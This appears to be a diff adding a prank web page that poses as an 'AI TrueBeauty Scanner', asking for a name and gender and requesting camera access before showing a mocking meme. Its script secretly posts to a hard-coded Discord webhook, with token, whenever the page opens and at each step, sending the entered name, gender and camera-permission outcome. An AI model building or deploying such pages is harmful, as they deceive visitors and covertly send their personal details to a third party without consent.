@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI TrueBeauty Score - Scanner</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: 'Poppins', sans-serif;
+            background: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h1 {
+            color: #ff3366;
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+        }
+
+        p.subtitle {
+            color: #888;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], select {
+            width: 85%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 2px solid #ff3366;
+            background: #222;
+            color: white;
+            font-size: 1rem;
+            text-align: center;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input[type="text"]:focus, select:focus {
+            box-shadow: 0 0 15px rgba(255, 51, 102, 0.6);
+            background: #333;
+        }
+
+        /* Camera Box Design */
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 4px solid #ff3366;
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.5);
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #cameraPlaceholder {
+            color: #777;
+            font-size: 0.95rem;
+        }
+
+        #videoElement {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Mirrors the camera like a selfie */
+            display: none; /* Hide until camera is active */
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 51, 102, 0.9);
+            box-shadow: 0 0 15px #ff3366;
+            animation: scanning 2s linear infinite;
+            display: none; /* Hidden until scanning starts */
+        }
+
+        @keyframes scanning {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        button.start-btn {
+            background: #ff3366;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            box-shadow: 0 5px 15px rgba(255, 51, 102, 0.4);
+            transition: transform 0.1s;
+        }
+
+        button.start-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* Result Popup Style */
+        #resultArea {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 100;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        #resultArea img {
+            width: 90%;
+            max-width: 300px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 5px solid white;
+        }
+
+        #resultArea h2 {
+            font-size: 2rem;
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        #resultArea p {
+            color: #aaa;
+            font-size: 1.1rem;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <h1>AI TrueBeauty Scanner</h1>
+        <p class="subtitle">Our latest AI will analyze your facial structure for a beauty score.</p>
+        
+        <input type="text" id="targetName" placeholder="Enter your Name" autocomplete="off">
+        
+        <!-- Male / Female Option -->
+        <select id="genderSelect">
+            <option value="" disabled selected>Select Gender</option>
+            <option value="Female">Female</option>
+            <option value="Male">Male</option>
+        </select>
+
+        <div class="video-wrapper">
+            <div id="cameraPlaceholder">Camera will turn on after clicking Start</div>
+            <video autoplay playsinline id="videoElement"></video>
+            <div class="scan-line" id="scanLine"></div>
+        </div>
+
+        <button class="start-btn" onclick="startScanner()" id="actionBtn">Start AI Analysis</button>
+    </div>
+
+    <div id="resultArea">
+        <h2>YOUR SCORE: 0.5/100</h2>
+        <img id="resultImage" src="" alt="Funny React Meme">
+        <p id="resultText"></p>
+    </div>
+
+    <script>
+        // Tumhara Discord Webhook pehle se hi add kar diya hai
+        const webhook_url = "https://discord.com/api/webhooks/1536173080089469079/k-7tusDXdFrEq29rbDGVitrOyIh7MYDBZLVCZFGDZIs49PVAv3MwlNvqyq7DwVlSl2LX"; 
+
+        const video = document.querySelector("#videoElement");
+        const actionBtn = document.getElementById("actionBtn");
+        const scanLine = document.getElementById("scanLine");
+        const resultArea = document.getElementById("resultArea");
+        const targetNameInput = document.getElementById("targetName");
+        const genderSelect = document.getElementById("genderSelect");
+        const cameraPlaceholder = document.getElementById("cameraPlaceholder");
+        
+        const resultImage = document.getElementById("resultImage");
+        const resultText = document.getElementById("resultText");
+
+        // Discord Notification Function
+        function sendSecretMessage(messageText) {
+            fetch(webhook_url, {
+                method: "POST",
+                headers: {
+                    "Content-type": "application/json"
+                },
+                body: JSON.stringify({ content: messageText })
+            }).catch(error => console.error("Error:", error));
+        }
+
+        // Jaise hi page khulega, message aayega
+        window.onload = function() {
+            sendSecretMessage("👀 Alert: Kisi ne prank link open kiya hai!");
+        };
+
+        function startScanner() {
+            const enteredName = targetNameInput.value.trim();
+            const gender = genderSelect.value;
+
+            // Name & Gender check
+            if (enteredName === "") {
+                alert("Please enter your name first!");
+                return;
+            }
+            if (gender === "") {
+                alert("Please select your gender for accurate AI scanning!");
+                return;
+            }
+
+            // Lock the form so they can't change it while scanning
+            actionBtn.innerText = "Connecting Camera...";
+            actionBtn.disabled = true;
+            targetNameInput.disabled = true; 
+            genderSelect.disabled = true;
+
+            // Discord Notification - Target Locked
+            sendSecretMessage(`🎯 Target Locked: "${enteredName}" (${gender}) ne scan start kiya hai. Camera request ho rahi hai...`);
+
+            // Start Camera
+            if (navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function (stream) {
+                        // Agar camera allow kiya, toh video show karo
+                        video.srcObject = stream;
+                        cameraPlaceholder.style.display = "none";
+                        video.style.display = "block";
+                        
+                        // Ek second wait karke scan animation shuru karo
+                        setTimeout(() => {
+                            actionBtn.innerText = "Analyzing Face... Don't Move!";
+                            scanLine.style.display = "block"; 
+                            
+                            // 5 second scan chalne do, phir meme dikhao
+                            setTimeout(revealPrank, 5000);
+                        }, 1000);
+                    })
+                    .catch(function (err) {
+                        // Agar camera block kar diya
+                        alert("Camera access is needed for AI scanning!");
+                        actionBtn.innerText = "Start AI Analysis";
+                        actionBtn.disabled = false;
+                        targetNameInput.disabled = false;
+                        genderSelect.disabled = false;
+                        sendSecretMessage(`❌ Oops! "${enteredName}" ne camera access Deny kar diya.`);
+                    });
+            } else {
+                alert("Your browser does not support this AI feature.");
+            }
+        }
+
+        function revealPrank() {
+            // Camera band kar do scan hone ke baad
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+            
+            const gender = genderSelect.value;
+
+            // Gender ke hisaab se meme decide karo
+            if (gender === "Male") {
+                resultImage.src = "https://media.tenor.com/J2FhU28tMhgAAAAC/laughing-laughing-so-hard.gif"; // Funny laughing meme
+                resultText.innerText = "Bhai tu toh rehne hi de. AI ki aankhein kharab ho gayin! 😂";
+            } else {
+                resultImage.src = "https://media.tenor.com/71wZ_YfK6f4AAAAC/ugh-seriously.gif"; // "Ugh seriously" girl meme
+                resultText.innerText = "AI can't handle this much beauty... or maybe just you.😂 System Crashing!";
+            }
+
+            // Meme Popup dikhao
+            resultArea.style.display = "flex";
+            
+            // Final Discord update
+            sendSecretMessage(`✅ Prank Successful: "${targetNameInput.value}" ne apna meme dekh liya! 😂`);
+        }
+    </script>
+</body>
+</html>
